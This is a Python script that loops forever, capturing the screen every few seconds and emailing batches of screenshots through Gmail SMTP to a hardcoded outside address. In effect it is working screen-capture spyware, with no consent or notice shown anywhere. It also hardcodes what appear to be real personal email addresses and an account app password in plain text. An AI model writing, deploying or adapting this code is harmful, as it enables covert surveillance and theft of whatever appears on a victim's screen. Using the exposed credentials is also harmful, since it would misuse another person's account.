import time
import smtplib
import pyautogui
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
 
EMAIL = 'johnjw2007@gmail.com'  # Your email
PASSWORD = 'sowe ocmn qtjr jsmt'  # Your email password
TO_EMAIL = 'kumaravelkuma07@gmail.com'  # Recipient's email
SMTP_SERVER = 'smtp.gmail.com'  # For Gmail
SMTP_PORT = 587  # For Gmail
SCREENSHOT_FOLDER = 'screenshots'  # Folder to store screenshots
SCREENSHOT_INTERVAL = 3  # Interval in seconds to take screenshots
SEND_INTERVAL = 10  # Interval in seconds to send emails with screenshots

# Create a folder to store screenshots if it doesn't exist
if not os.path.exists(SCREENSHOT_FOLDER):
    os.makedirs(SCREENSHOT_FOLDER)

# Function to take a screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    filename = f'{SCREENSHOT_FOLDER}/screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
    screenshot.save(filename)
    return filename

# Function to send an email with attachments
def send_email(attachment_paths):
    # Set up the MIME
    msg = MIMEMultipart()
    msg['From'] = EMAIL
    msg['To'] = TO_EMAIL
    msg['Subject'] = 'Screenshots from Your Program'

    # Attach the screenshots
    for filepath in attachment_paths:
        part = MIMEBase('application', 'octet-stream')
        with open(filepath, 'rb') as f:
            part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
        msg.attach(part)

    # Send email
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()  # Start TLS encryption
            server.login(EMAIL, PASSWORD)  # Log into the email account
            server.sendmail(EMAIL, TO_EMAIL, msg.as_string())
            print('Email sent successfully!')
    except Exception as e:
        print(f'Error sending email: {e}')

# Main function
def main():
    screenshots_taken = []
    while True:
        # Take a screenshot every SCREENSHOT_INTERVAL seconds
        screenshot = take_screenshot()
        screenshots_taken.append(screenshot)
        print(f'Screenshot taken: {screenshot}')
        
        # If it has been SEND_INTERVAL seconds, send the email
        if len(screenshots_taken) * SCREENSHOT_INTERVAL >= SEND_INTERVAL:
            send_email(screenshots_taken)
            screenshots_taken.clear()  # Clear the list after sending email

        time.sleep(SCREENSHOT_INTERVAL)  # Wait for the next screenshot

if __name__ == '__main__':
    main()